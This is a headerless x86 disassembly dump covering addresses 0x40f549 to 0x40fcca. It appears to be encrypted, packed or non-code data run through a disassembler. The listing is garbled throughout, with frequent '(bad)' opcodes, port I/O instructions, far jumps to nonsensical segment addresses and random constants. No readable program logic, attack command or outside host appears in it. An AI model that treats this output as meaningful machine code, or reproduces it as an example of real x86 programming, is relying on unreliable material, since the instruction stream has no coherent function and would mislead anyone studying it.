  40f549:	mov    ebp,0x36e5aa8c
  40f54e:	aad    0x83
  40f550:	sti    
  40f551:	sbb    esi,DWORD PTR [edi+0x284243f7]
  40f557:	xchg   edi,eax
  40f558:	push   ebx
  40f559:	in     al,dx
  40f55a:	(bad)  
  40f55b:	cmp    ebp,DWORD PTR [ebx]
  40f55d:	push   ss
  40f55e:	add    al,BYTE PTR [edi-0x35]
  40f561:	pushf  
  40f562:	stos   BYTE PTR es:[edi],al
  40f563:	inc    ecx
  40f564:	mov    al,0x32
  40f566:	sti    
  40f567:	lahf   
  40f568:	call   0xdfa5:0x3ac8179d
  40f56f:	pop    ss
  40f570:	rol    DWORD PTR [edx-0x7283429f],1
  40f576:	and    eax,0xfcb6142f
  40f57b:	fsubr  QWORD PTR [ecx]
  40f57d:	jp     0x40f5b8
  40f57f:	add    dl,BYTE PTR [eax+esi*8+0x5f]
  40f583:	dec    ecx
  40f584:	mov    cl,0xdd
  40f586:	or     DWORD PTR [ebp-0x46954699],edi
  40f58c:	mov    ecx,0xe626a1a1
  40f591:	imul   ebp,DWORD PTR [ebp+0x3c8ccd88],0x5eaa6466
  40f59b:	in     eax,dx
  40f59c:	mov    WORD PTR [eax+0x670e1439],ds
  40f5a2:	es (bad) 
  40f5a4:	jns    0x40f582
  40f5a6:	(bad)  
  40f5a7:	ret    
  40f5a8:	dec    ecx
  40f5a9:	addr16 stc 
  40f5ab:	add    cl,al
  40f5ad:	adc    DWORD PTR [eax],eax
  40f5af:	dec    esi
  40f5b0:	fstp   QWORD PTR [edi-0x44]
  40f5b3:	test   BYTE PTR [edi],bh
  40f5b5:	cmp    BYTE PTR [esp+edx*8],bl
  40f5b8:	lock jo 0x40f5d7
  40f5bb:	sbb    al,0x86
  40f5bd:	dec    ebx
  40f5be:	push   cs
  40f5bf:	nop
  40f5c0:	jbe    0x40f560
  40f5c2:	bound  eax,QWORD PTR [esi+0x5f]
  40f5c5:	in     eax,0x15
  40f5c7:	das    
  40f5c8:	adc    BYTE PTR [ebp+eax*8+0x5a],ch
  40f5cc:	xlat   BYTE PTR ds:[ebx]
  40f5cd:	mov    ch,dl
  40f5cf:	add    al,0xdc
  40f5d1:	shl    BYTE PTR [ebx-0x53],cl
  40f5d4:	add    esi,DWORD PTR [edx-0x5a]
  40f5d7:	lods   eax,DWORD PTR ds:[esi]
  40f5d8:	mov    bl,0x18
  40f5da:	mov    ebp,0x7c4188a0
  40f5df:	mov    edx,DWORD PTR [ecx*4-0x2b0e564d]
  40f5e6:	push   0x69
  40f5e8:	and    eax,0x73be87d7
  40f5ed:	outs   dx,DWORD PTR ds:[esi]
  40f5ee:	ds scas al,BYTE PTR es:[edi]
  40f5f0:	jmp    0x40f57b
  40f5f2:	sub    eax,DWORD PTR [ecx+0x278eae5c]
  40f5f8:	jl     0x40f5d1
  40f5fa:	mov    al,0x65
  40f5fc:	or     DWORD PTR [eax+ecx*1-0x54],edi
  40f600:	jl     0x40f58f
  40f602:	or     edi,0xdcc6d176
  40f608:	sbb    BYTE PTR [eax+0x4b],bl
  40f60b:	and    eax,0x1b586a67
  40f610:	shl    BYTE PTR [edx],0x5d
  40f613:	cmp    DWORD PTR [eax],0xf5b5c6ed
  40f619:	mov    esp,0xd03ba75d
  40f61e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f61f:	adc    ecx,ebx
  40f621:	fisub  WORD PTR [ecx+0x36978c49]
  40f627:	cmp    eax,0xd461283d
  40f62c:	iret   
  40f62d:	(bad)  
  40f62e:	dec    ch
  40f630:	fiadd  DWORD PTR [edx-0x4b]
  40f633:	mov    ds:0xcb346585,al
  40f638:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f639:	push   esi
  40f63a:	int3   
  40f63b:	pop    es
  40f63c:	ins    DWORD PTR es:[edi],dx
  40f63d:	and    BYTE PTR [eax-0x63dc64ee],0xf8
  40f644:	imul   eax,DWORD PTR [esi+0x5d7ffc27],0xffffffb1
  40f64b:	pop    ss
  40f64c:	shl    DWORD PTR [eax+0xd],0xce
  40f650:	mov    bl,0x88
  40f652:	(bad)  
  40f653:	push   ebp
  40f654:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f655:	push   edx
  40f656:	out    0x27,al
  40f658:	inc    eax
  40f659:	inc    eax
  40f65a:	sbb    BYTE PTR [edx-0x580c4d7f],bl
  40f660:	xchg   ebp,eax
  40f661:	jne    0x40f61e
  40f663:	jmp    0x19f1336e
  40f668:	and    BYTE PTR [ebp-0x76d119f2],ch
  40f66e:	(bad)  
  40f66f:	cmp    dl,cl
  40f671:	mov    edi,0xb404678d
  40f676:	add    al,0xb0
  40f678:	ss xchg esp,eax
  40f67a:	add    BYTE PTR [edi-0x28e40bdd],0xf7
  40f681:	pop    esp
  40f682:	jp     0x40f662
  40f684:	fnstsw ax
  40f686:	mov    esi,0xd5655266
  40f68b:	jmp    0xfcb90893
  40f690:	(bad)  
  40f691:	lock lahf 
  40f693:	mov    edx,0x1ad69bfd
  40f698:	fld    TBYTE PTR [esi+0x4b2aee42]
  40f69e:	aas    
  40f69f:	fidiv  DWORD PTR [ecx-0x72c17b33]
  40f6a5:	fst    st(5)
  40f6a7:	ja     0x40f68c
  40f6a9:	cmp    DWORD PTR [esi+edi*2],edx
  40f6ac:	bound  ebp,QWORD PTR [eax+0xe315f75]
  40f6b2:	js     0x40f63c
  40f6b4:	idiv   BYTE PTR [esi]
  40f6b6:	repz pop ebx
  40f6b8:	and    edi,edi
  40f6ba:	pop    eax
  40f6bb:	test   esi,edi
  40f6bd:	inc    edx
  40f6be:	sub    dh,ch
  40f6c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6c1:	outs   dx,BYTE PTR ds:[esi]
  40f6c2:	push   ds
  40f6c3:	mov    ah,bh
  40f6c5:	mov    ecx,0x121514f1
  40f6ca:	push   edi
  40f6cb:	pop    edi
  40f6cc:	or     ah,BYTE PTR [edx]
  40f6ce:	test   al,0x89
  40f6d0:	shl    DWORD PTR [esi],1
  40f6d2:	rcl    DWORD PTR [ecx+0x1a],cl
  40f6d5:	es pop ebx
  40f6d7:	push   es
  40f6d8:	sub    cl,bl
  40f6da:	popf   
  40f6db:	cli    
  40f6dc:	add    DWORD PTR [ecx-0x52],ebp
  40f6df:	add    eax,0x752d0461
  40f6e4:	(bad)  
  40f6e6:	xor    eax,0x26ce6872
  40f6eb:	push   eax
  40f6ec:	push   ecx
  40f6ed:	clc    
  40f6ee:	arpl   WORD PTR [bp+di-0x62db],bx
  40f6f3:	rcl    DWORD PTR [edi+0x20c2c04f],1
  40f6f9:	dec    ebp
  40f6fa:	or     edi,0xb1899ace
  40f700:	mov    esi,0xcde9a451
  40f705:	test   eax,0xf5cfa657
  40f70a:	mov    DWORD PTR [ecx],ebx
  40f70c:	cli    
  40f70d:	test   eax,0x299ce04d
  40f712:	or     al,0xac
  40f714:	call   0xeea6:0x96960c47
  40f71b:	les    ecx,FWORD PTR [eax+0x79]
  40f71e:	int3   
  40f71f:	(bad)  
  40f720:	jns    0x40f739
  40f722:	inc    ebp
  40f723:	inc    edx
  40f724:	add    ecx,0xde7094d6
  40f72a:	loope  0x40f769
  40f72c:	cld    
  40f72d:	sub    ch,bh
  40f72f:	mov    dl,0x49
  40f731:	aaa    
  40f732:	shr    DWORD PTR [ebx-0x64],cl
  40f735:	pop    ds
  40f736:	sbb    edi,0xffffffff
  40f739:	dec    esi
  40f73a:	jp     0x40f7ab
  40f73c:	xlat   BYTE PTR ds:[ebx]
  40f73d:	mov    bh,0x4a
  40f73f:	ror    DWORD PTR [ecx+0x63],0x63
  40f743:	pop    DWORD PTR [eax+eax*4]
  40f746:	pop    ecx
  40f747:	cli    
  40f748:	push   ecx
  40f749:	sub    DWORD PTR [ebp+0x3dc5b12c],ecx
  40f74f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f750:	mov    ebp,0x67d30159
  40f755:	jae    0x40f704
  40f757:	jae    0x40f73f
  40f759:	ret    0x48e4
  40f75c:	jns    0x40f6e8
  40f75e:	push   ebx
  40f75f:	ret    0x853d
  40f762:	in     eax,0xdf
  40f764:	imul   ebx,esi,0x25
  40f767:	pop    esi
  40f768:	movups xmm2,XMMWORD PTR [ecx+0x763cc1f0]
  40f76f:	loope  0x40f7a5
  40f771:	aas    
  40f772:	pop    ebp
  40f773:	mov    esi,0x1b78c00c
  40f778:	mov    ecx,0x3d952fa7
  40f77d:	dec    esp
  40f77e:	xchg   ebx,eax
  40f77f:	xchg   edx,eax
  40f780:	dec    eax
  40f781:	cmp    ah,dl
  40f783:	mov    bl,0x96
  40f785:	xchg   esp,eax
  40f786:	ins    BYTE PTR es:[edi],dx
  40f787:	or     al,0x6f
  40f789:	loope  0x40f762
  40f78b:	outs   dx,DWORD PTR ds:[esi]
  40f78c:	loopne 0x40f7a9
  40f78e:	xchg   esp,eax
  40f78f:	adc    ebp,edi
  40f791:	add    eax,0x3702919f
  40f796:	mov    esp,0xcabe8fe7
  40f79b:	fistp  WORD PTR [ecx-0x38]
  40f79e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f79f:	out    0x4f,eax
  40f7a1:	leave  
  40f7a2:	sbb    edi,DWORD PTR [esi]
  40f7a4:	sbb    edi,DWORD PTR [esi-0x2]
  40f7a7:	and    al,0x62
  40f7a9:	add    al,0x59
  40f7ab:	loop   0x40f826
  40f7ad:	out    dx,al
  40f7ae:	xchg   BYTE PTR [esi+0x1a498577],dl
  40f7b4:	pop    edx
  40f7b5:	pop    es
  40f7b6:	xor    eax,0x73d87663
  40f7bb:	(bad)  
  40f7bc:	mov    DWORD PTR es:[edi],edi
  40f7bf:	mov    dl,0xaa
  40f7c1:	popa   
  40f7c2:	mov    WORD PTR [eax],ss
  40f7c4:	xor    DWORD PTR [edi],esp
  40f7c6:	mov    cl,0x8c
  40f7c8:	call   0x65c087cd
  40f7cd:	mov    bh,0x1d
  40f7cf:	out    dx,al
  40f7d0:	cmp    ebx,DWORD PTR [esi]
  40f7d2:	lods   eax,DWORD PTR ds:[esi]
  40f7d3:	sti    
  40f7d4:	mov    WORD PTR [ebx-0x61afc0b4],gs
  40f7da:	jl     0x40f83d
  40f7dc:	cmp    ch,BYTE PTR [ebp-0x11]
  40f7df:	ror    DWORD PTR [ecx+0x1a],cl
  40f7e2:	in     al,dx
  40f7e3:	shr    cl,cl
  40f7e5:	std    
  40f7e6:	ja     0x40f7c0
  40f7e8:	xchg   BYTE PTR [esi],bh
  40f7ea:	adc    dl,BYTE PTR [ecx+0x3]
  40f7ed:	lock adc al,0xe3
  40f7f0:	mov    ds:0xb1f6232a,eax
  40f7f5:	pop    esp
  40f7f6:	mov    cl,dl
  40f7f8:	xor    al,0x9f
  40f7fa:	sti    
  40f7fb:	inc    edx
  40f7fc:	sub    esi,DWORD PTR [esi+0x5d]
  40f7ff:	and    al,0xf9
  40f801:	push   es
  40f802:	dec    edi
  40f803:	clc    
  40f804:	aam    0x48
  40f806:	mov    ah,0x49
  40f808:	imul   eax,edi,0x9a7f5eab
  40f80e:	jle    0x40f7e2
  40f810:	dec    esp
  40f811:	fstp   TBYTE PTR [esi+0x7a946fb8]
  40f817:	test   al,0xb1
  40f819:	lea    ecx,[esi+0x4]
  40f81c:	mov    al,BYTE PTR [esp+edx*1]
  40f81f:	sbb    DWORD PTR [ecx],esi
  40f821:	fldcw  WORD PTR [ecx-0xe]
  40f824:	mov    BYTE PTR [eax-0x3a],bh
  40f827:	call   0x1cb12859
  40f82c:	nop
  40f82d:	icebp  
  40f82e:	call   0xf662b76a
  40f833:	xor    al,ah
  40f835:	mov    bl,0x35
  40f837:	retf   0xaa68
  40f83a:	test   DWORD PTR [eax+0x43],ebx
  40f83d:	sar    DWORD PTR [ebp-0x391e4146],0xaf
  40f844:	xor    esi,DWORD PTR [esp+0x12]
  40f848:	and    al,0x99
  40f84a:	adc    BYTE PTR [edx-0x3b],bl
  40f84d:	ja     0x40f7f8
  40f84f:	push   edx
  40f850:	stc    
  40f851:	xor    edx,DWORD PTR [edx]
  40f853:	push   ebx
  40f854:	lds    edi,FWORD PTR [ecx-0x42]
  40f857:	dec    ecx
  40f858:	sti    
  40f859:	fld    DWORD PTR [edi+0x4e6e5503]
  40f85f:	adc    eax,0xa4fe7df4
  40f864:	shl    eax,cl
  40f866:	mov    esp,0x510b2fb
  40f86b:	add    ah,cl
  40f86d:	jge    0x40f839
  40f86f:	ds lock push edx
  40f872:	dec    esi
  40f873:	sub    bh,BYTE PTR [ecx+0x58]
  40f876:	cdq    
  40f877:	bound  esp,QWORD PTR [edi]
  40f879:	xchg   ebp,eax
  40f87a:	mov    eax,ds:0xd362675a
  40f87f:	mov    edi,0x47b10b5b
  40f884:	dec    BYTE PTR [ecx]
  40f886:	sbb    esp,DWORD PTR [ebx]
  40f888:	xor    al,dh
  40f88a:	call   0x46c68586
  40f88f:	sbb    edi,ebx
  40f891:	lea    edi,[eax-0x681d658b]
  40f897:	pop    esi
  40f898:	cmp    al,0x64
  40f89a:	(bad)  
  40f89c:	push   0xd7e9c6c7
  40f8a1:	lahf   
  40f8a2:	or     BYTE PTR [esi],bl
  40f8a4:	push   ds
  40f8a5:	lods   al,BYTE PTR ds:[esi]
  40f8a6:	jbe    0x40f84b
  40f8a8:	pop    es
  40f8a9:	or     cl,BYTE PTR [ecx-0x8]
  40f8ac:	cmp    BYTE PTR [edx],0x51
  40f8af:	mov    ds:0x4f2b71ae,eax
  40f8b4:	cmp    ecx,0x494360a3
  40f8ba:	mov    ds:0x4e5dbb0a,eax
  40f8bf:	push   0x85be656e
  40f8c4:	(bad)  
  40f8c5:	cwde   
  40f8c6:	mov    eax,0x6c078ac9
  40f8cb:	and    ecx,DWORD PTR [esi]
  40f8cd:	add    eax,0xa1c14e79
  40f8d2:	daa    
  40f8d3:	enter  0x3fc1,0xc5
  40f8d7:	jmp    0x8f87:0x5a04ca43
  40f8de:	call   0xf83f0885
  40f8e3:	jmp    0x3e2f67af
  40f8e8:	and    eax,0x488b44ca
  40f8ed:	jbe    0x40f8f3
  40f8ef:	lahf   
  40f8f0:	sbb    esi,DWORD PTR [eax]
  40f8f2:	mov    WORD PTR [eax-0x6b],?
  40f8f5:	arpl   WORD PTR [ecx],bp
  40f8f7:	push   0x5c2e4bcf
  40f8fc:	enter  0x8f91,0xb9
  40f900:	inc    edx
  40f901:	push   ds
  40f902:	sti    
  40f903:	loop   0x40f8a9
  40f905:	sbb    DWORD PTR [ebx+0x45],edx
  40f908:	mov    ds:0xfb4735ff,eax
  40f90d:	inc    edi
  40f90e:	xchg   BYTE PTR [ebx-0x4d],ah
  40f911:	std    
  40f912:	test   eax,0x7550203f
  40f917:	sbb    al,0x73
  40f919:	mov    esi,0x337b217f
  40f91e:	add    cl,bh
  40f920:	xor    ecx,DWORD PTR [edx+0x1be50ac2]
  40f926:	jecxz  0x40f94a
  40f928:	pop    esi
  40f929:	leave  
  40f92a:	mov    eax,0x9b43b5b2
  40f92f:	into   
  40f930:	mov    ecx,0xbdd7775e
  40f935:	nop
  40f936:	rol    DWORD PTR [edx-0x7a],0x93
  40f93a:	inc    edx
  40f93b:	and    eax,0xb4d7a75c
  40f940:	adc    bh,BYTE PTR [edx-0x8]
  40f943:	sahf   
  40f944:	imul   ecx,DWORD PTR cs:[ecx+edx*1+0x343779dd],0xffffffa4
  40f94d:	repnz xchg edx,eax
  40f94f:	sub    al,0xf6
  40f951:	push   ebx
  40f952:	inc    ebx
  40f953:	push   cs
  40f954:	jmp    0x40f9ba
  40f956:	mov    al,0xe7
  40f958:	or     DWORD PTR [esp+ebx*1-0x6f],eax
  40f95c:	call   0x6d96:0x99ecc41
  40f963:	and    al,0x2a
  40f965:	push   es
  40f966:	and    BYTE PTR [eax],al
  40f968:	sub    esi,DWORD PTR [edi+0x5cbeb500]
  40f96e:	sbb    BYTE PTR [eax+0x4],ch
  40f971:	jnp    0x40f963
  40f973:	xchg   edx,eax
  40f974:	je     0x40f9c1
  40f976:	mov    ch,0x38
  40f978:	dec    esp
  40f979:	mov    DWORD PTR [ecx],ebx
  40f97b:	loopne 0x40f9b1
  40f97d:	sar    BYTE PTR [esi-0x13],0xe1
  40f981:	jne    0x40f9c4
  40f983:	xchg   ecx,eax
  40f984:	xchg   ecx,eax
  40f985:	adc    bl,BYTE PTR [eax+0x4eee4d0a]
  40f98b:	clc    
  40f98c:	push   0x6de49146
  40f991:	jmp    0xf4b8:0xb12813f0
  40f998:	mov    bl,0xc3
  40f99a:	sti    
  40f99b:	xchg   ebp,eax
  40f99c:	jl     0x40f9b3
  40f99e:	push   ecx
  40f99f:	and    ch,BYTE PTR [edi]
  40f9a1:	add    DWORD PTR [ecx+0x6f],ecx
  40f9a4:	xchg   ebx,eax
  40f9a5:	adc    esp,DWORD PTR [esi]
  40f9a7:	jg     0x40f98c
  40f9a9:	loop   0x40f966
  40f9ab:	push   esp
  40f9ac:	mov    dl,0xe1
  40f9ae:	int    0xae
  40f9b0:	jp     0x40f972
  40f9b2:	out    0x25,al
  40f9b4:	test   BYTE PTR ss:[esi+edi*4-0x2cb4d986],ch
  40f9bc:	sbb    ecx,DWORD PTR [ebx]
  40f9be:	and    eax,0xdba8be27
  40f9c3:	jnp    0x40f9f4
  40f9c5:	sbb    esi,DWORD PTR [esi+edi*2+0x3ddf2173]
  40f9cc:	stos   BYTE PTR es:[edi],al
  40f9cd:	cmp    BYTE PTR gs:[eax],0xf2
  40f9d1:	mov    ch,dh
  40f9d3:	pop    esp
  40f9d4:	mov    eax,0x489c5968
  40f9d9:	(bad)  
  40f9da:	jno    0x40f99a
  40f9dc:	lds    ecx,FWORD PTR [ebx-0x398c297a]
  40f9e2:	mov    dl,0x0
  40f9e4:	or     esi,DWORD PTR [esi+ebx*1+0x71e6297a]
  40f9eb:	je     0x40fa6b
  40f9ed:	and    cl,cl
  40f9ef:	ds shl eax,1
  40f9f2:	bound  ecx,QWORD PTR [edx-0x5b9cd368]
  40f9f8:	fucom  st(3)
  40f9fa:	jno    0x40f99c
  40f9fc:	dec    ebp
  40f9fd:	mov    ebx,0xa007827
  40fa02:	xchg   ecx,eax
  40fa03:	stos   BYTE PTR es:[edi],al
  40fa04:	push   ebx
  40fa05:	sbb    al,ch
  40fa07:	and    BYTE PTR [edx-0x43],ah
  40fa0a:	sahf   
  40fa0b:	into   
  40fa0c:	jl     0x40f9a0
  40fa0e:	push   edx
  40fa0f:	ins    BYTE PTR es:[edi],dx
  40fa10:	jo     0x40f9ce
  40fa12:	sti    
  40fa13:	mov    esi,DWORD PTR [esi-0x6de7db79]
  40fa19:	adc    DWORD PTR ds:[ecx-0x14],ebp
  40fa1d:	jnp    0x40fa1d
  40fa1f:	lahf   
  40fa20:	xor    ecx,DWORD PTR [edi+0x34a33588]
  40fa26:	mov    dh,0x4f
  40fa28:	in     al,dx
  40fa29:	and    ebx,DWORD PTR [ebp-0x1d402637]
  40fa2f:	push   ss
  40fa30:	fimul  WORD PTR [edx]
  40fa32:	push   0xb29853d4
  40fa37:	pop    edi
  40fa38:	push   es
  40fa39:	popa   
  40fa3a:	push   ss
  40fa3b:	push   es
  40fa3c:	(bad)  
  40fa3d:	xor    ebx,ebx
  40fa3f:	and    dl,BYTE PTR [edx-0x387c74eb]
  40fa45:	gs inc ebx
  40fa47:	lea    ebp,[ebx-0x40]
  40fa4a:	adc    eax,0xe62c7a53
  40fa4f:	test   dh,ch
  40fa51:	mov    ecx,0x85b4c7ed
  40fa56:	xchg   ecx,eax
  40fa57:	dec    edi
  40fa58:	out    dx,al
  40fa59:	das    
  40fa5a:	xor    eax,DWORD PTR [ebp+edx*2+0x41]
  40fa5e:	arpl   WORD PTR [edx+0x5fdf39c4],sp
  40fa64:	pop    ds
  40fa65:	cdq    
  40fa66:	sub    bh,ah
  40fa68:	and    al,0x73
  40fa6a:	(bad)  
  40fa6b:	outs   dx,DWORD PTR ds:[esi]
  40fa6c:	call   0xf083504f
  40fa71:	jg     0x40fa47
  40fa73:	mov    ds:0xf3ead0a5,eax
  40fa78:	gs or  al,cl
  40fa7b:	cmove  edx,ecx
  40fa7e:	push   ds
  40fa7f:	and    dl,BYTE PTR [edi+0x5f]
  40fa82:	aaa    
  40fa83:	adc    BYTE PTR ds:0x9b56dd6f,bh
  40fa89:	ret    
  40fa8a:	sar    DWORD PTR [esi-0x25],cl
  40fa8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa8e:	mov    fs,WORD PTR [edi+0x3105fc8c]
  40fa94:	addr16 aas 
  40fa96:	and    eax,DWORD PTR [edx+0x21]
  40fa99:	push   esp
  40fa9a:	or     eax,0xd4a4a1ac
  40fa9f:	mov    eax,ds:0x9de41ba4
  40faa4:	mov    WORD PTR [edx-0x47],cs
  40faa7:	xchg   esp,eax
  40faa8:	aam    0x8e
  40faaa:	(bad)  
  40faab:	iret   
  40faac:	cmp    al,0xd3
  40faae:	mov    eax,ds:0xd7430861
  40fab3:	xchg   DWORD PTR [ebx],edx
  40fab5:	clc    
  40fab6:	xor    eax,0x5011a96e
  40fabb:	test   eax,0xd61bc92e
  40fac0:	jg     0x40fb3c
  40fac2:	mov    cl,0x27
  40fac4:	push   ebp
  40fac5:	mov    ss,WORD PTR [ecx+eax*2+0x68]
  40fac9:	jbe    0x40fb1d
  40facb:	ins    DWORD PTR es:[edi],dx
  40facc:	bound  esp,QWORD PTR [esi]
  40face:	out    0xa0,eax
  40fad0:	mov    esp,0x29c2a34
  40fad5:	and    al,0x92
  40fad7:	mov    esi,0xa827a81d
  40fadc:	stos   DWORD PTR es:[edi],eax
  40fadd:	popa   
  40fade:	jle    0x40fa64
  40fae0:	pushf  
  40fae1:	and    esp,ecx
  40fae3:	test   DWORD PTR [edi+edx*2-0x24],ebx
  40fae7:	push   ss
  40fae8:	add    BYTE PTR [si],dl
  40faeb:	pushf  
  40faec:	xor    eax,0x2bf32f31
  40faf1:	xchg   ebp,eax
  40faf2:	in     al,dx
  40faf3:	jb     0x40fb38
  40faf5:	enter  0xdd31,0x87
  40faf9:	mov    esi,eax
  40fafb:	jo     0x40fb52
  40fafd:	xchg   esi,eax
  40fafe:	hlt    
  40faff:	jae    0x40fb30
  40fb01:	scas   al,BYTE PTR es:[edi]
  40fb02:	mov    esp,0x1eba0c94
  40fb07:	sub    cl,BYTE PTR [ebp+0x39626c7a]
  40fb0d:	fadd   QWORD PTR [edx-0x18544556]
  40fb13:	ja     0x40fb33
  40fb15:	sbb    DWORD PTR [edx-0xb],ebx
  40fb18:	es (bad) 
  40fb1a:	xlat   BYTE PTR ds:[ebx]
  40fb1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb1c:	shl    esi,cl
  40fb1e:	xchg   ebx,eax
  40fb20:	lahf   
  40fb21:	imul   ebx,DWORD PTR [ecx],0x7a
  40fb24:	stc    
  40fb25:	scas   eax,DWORD PTR es:[edi]
  40fb26:	stos   BYTE PTR es:[edi],al
  40fb27:	add    al,0x7b
  40fb29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb2a:	jne    0x40fb03
  40fb2c:	sbb    eax,0x9620ce3f
  40fb31:	fnstenv [edi+0x18de2c68]
  40fb37:	or     esp,DWORD PTR [edi]
  40fb39:	pop    edi
  40fb3a:	sbb    ebx,ebp
  40fb3c:	add    DWORD PTR [eax],ebp
  40fb3e:	sub    cl,dl
  40fb40:	or     bl,bl
  40fb42:	push   edi
  40fb43:	cli    
  40fb44:	and    eax,0x7fae66a7
  40fb49:	cmp    cl,BYTE PTR [ecx-0x1303198b]
  40fb4f:	daa    
  40fb50:	sub    al,0xbe
  40fb52:	jmp    0x1aa8:0xbf119a2a
  40fb59:	leave  
  40fb5a:	not    eax
  40fb5c:	and    DWORD PTR [ebp+0x29],eax
  40fb5f:	loope  0x40fae4
  40fb61:	aas    
  40fb62:	outs   dx,BYTE PTR ds:[esi]
  40fb63:	out    dx,eax
  40fb64:	popa   
  40fb65:	sub    BYTE PTR [edx+0x641eca92],ah
  40fb6b:	jbe    0x40fb7c
  40fb6d:	imul   esi,ebp,0x5d
  40fb70:	pop    esp
  40fb71:	inc    edx
  40fb72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb73:	rcr    BYTE PTR [edx-0x3de2fb28],0x40
  40fb7a:	add    eax,0x3f4f6801
  40fb7f:	pusha  
  40fb80:	lods   al,BYTE PTR ds:[esi]
  40fb81:	adc    eax,0xb96ef45f
  40fb86:	inc    edi
  40fb87:	fcomp  DWORD PTR [eax-0x3b794be5]
  40fb8d:	cmc    
  40fb8e:	sub    al,0x84
  40fb90:	push   esi
  40fb91:	sub    al,0xca
  40fb93:	cmp    al,0xfb
  40fb95:	xchg   DWORD PTR [ecx+edx*4-0x3a],esp
  40fb99:	ins    DWORD PTR es:[edi],dx
  40fb9a:	out    0x86,eax
  40fb9c:	and    al,0x8e
  40fb9e:	push   es
  40fb9f:	out    0x99,al
  40fba1:	adc    ebp,edi
  40fba3:	shr    BYTE PTR [ebx+edi*2+0x1e6baefc],cl
  40fbaa:	or     DWORD PTR [ecx],edi
  40fbac:	dec    ebx
  40fbad:	mov    edx,esi
  40fbaf:	aaa    
  40fbb0:	add    ebp,eax
  40fbb2:	and    DWORD PTR [ecx-0x57c0df07],0x62a62f01
  40fbbc:	ss mov al,0xcf
  40fbbf:	imul   ecx,DWORD PTR [ebp-0x1edde185],0x51d621c
  40fbc9:	outs   dx,DWORD PTR ds:[esi]
  40fbca:	test   BYTE PTR [ecx+0xd],ah
  40fbcd:	popf   
  40fbce:	mov    eax,ds:0x1d94c59b
  40fbd3:	mov    eax,es:0x5e20391a
  40fbd9:	mov    dl,BYTE PTR [ebp-0x672f1fc7]
  40fbdf:	gs pop ss
  40fbe1:	pop    ds
  40fbe2:	pop    esp
  40fbe3:	fs call 0xb612bc9f
  40fbe9:	mov    bl,0x9b
  40fbeb:	in     al,dx
  40fbec:	xchg   bl,ah
  40fbee:	cmp    ch,dl
  40fbf0:	cmp    BYTE PTR [eax-0x7c3e4f53],0xc8
  40fbf7:	loop   0x40fc0b
  40fbf9:	jns    0x40fc2a
  40fbfb:	jl     0x40fc54
  40fbfd:	mov    bl,0xe2
  40fbff:	lds    esi,FWORD PTR [eax-0x2942b679]
  40fc05:	jmp    0xd52e:0x90a5c01e
  40fc0c:	dec    ebp
  40fc0d:	aas    
  40fc0e:	das    
  40fc0f:	test   BYTE PTR [ecx+0x55],ah
  40fc12:	fwait
  40fc13:	out    0x4f,eax
  40fc15:	loopne 0x40fc51
  40fc17:	aas    
  40fc18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc19:	nop
  40fc1a:	mov    bl,0xe6
  40fc1c:	inc    ebp
  40fc1d:	lea    edx,[ebx-0xca1508e]
  40fc23:	push   edi
  40fc24:	adc    eax,0xa8900c07
  40fc29:	mov    esp,0xcee18efb
  40fc2e:	ret    0xcac0
  40fc31:	mov    WORD PTR [eax-0x46],?
  40fc34:	into   
  40fc35:	fst    QWORD PTR [ecx+0x79c86ef1]
  40fc3b:	mov    cl,0xe0
  40fc3d:	mov    cl,0x69
  40fc3f:	and    DWORD PTR [edx],esp
  40fc41:	cli    
  40fc42:	sbb    BYTE PTR [eax],al
  40fc44:	xlat   BYTE PTR ds:[ebx]
  40fc45:	stos   BYTE PTR es:[edi],al
  40fc46:	ins    BYTE PTR es:[edi],dx
  40fc47:	aad    0xf3
  40fc49:	int3   
  40fc4a:	xor    bh,BYTE PTR [ebp+0x37772301]
  40fc50:	pusha  
  40fc51:	ds inc edx
  40fc53:	xchg   esi,eax
  40fc54:	or     cl,0xba
  40fc57:	and    DWORD PTR [edx-0x79],ebx
  40fc5a:	cmp    ebp,edi
  40fc5c:	or     eax,0x63ec3f10
  40fc61:	add    BYTE PTR [esi],al
  40fc63:	js     0x40fc98
  40fc65:	pop    ebx
  40fc66:	dec    ecx
  40fc67:	adc    al,0x5b
  40fc69:	test   BYTE PTR [edi],0xc8
  40fc6c:	sbb    esp,DWORD PTR [edi+0x2f]
  40fc6f:	cmc    
  40fc70:	or     bh,al
  40fc72:	retf   
  40fc73:	cmp    ebx,DWORD PTR [eax+0x2610521b]
  40fc79:	pop    ecx
  40fc7a:	jmp    DWORD PTR [esi+0x15]
  40fc7d:	outs   dx,DWORD PTR ds:[esi]
  40fc7e:	sbb    BYTE PTR [edx+edi*2+0x771e0bd3],dl
  40fc85:	dec    esi
  40fc86:	daa    
  40fc87:	adc    DWORD PTR [ecx+0x4cdf5dfb],0x66
  40fc8e:	ret    
  40fc8f:	rcr    BYTE PTR [ecx+0x12],0x80
  40fc93:	test   ch,ch
  40fc95:	mov    esp,DWORD PTR [edi]
  40fc97:	or     ebp,ecx
  40fc99:	jno    0x40fc44
  40fc9b:	cwde   
  40fc9c:	inc    esp
  40fc9d:	loop   0x40fc25
  40fc9f:	rcr    BYTE PTR [ebx+eax*2+0x44],1
  40fca3:	leave  
  40fca4:	sahf   
  40fca5:	pop    es
  40fca6:	inc    edx
  40fca7:	cmp    bl,BYTE PTR [edx]
  40fca9:	aad    0x29
  40fcab:	xchg   edx,eax
  40fcac:	jmp    0xc874:0xdd7932b3
  40fcb3:	hlt    
  40fcb4:	jb     0x40fc5d
  40fcb6:	dec    edi
  40fcb7:	iretw  
  40fcb9:	xor    al,0x99
  40fcbb:	mov    dh,BYTE PTR gs:[edx-0x75]
  40fcbf:	cmp    bl,dl
  40fcc1:	cmp    BYTE PTR [edi+0x45],0x57
  40fcc5:	jl     0x40fc57
  40fcc7:	push   edx
  40fcc8:	sub    DWORD PTR [eax],edx
  40fcca:	cs jge 0x40fc9f
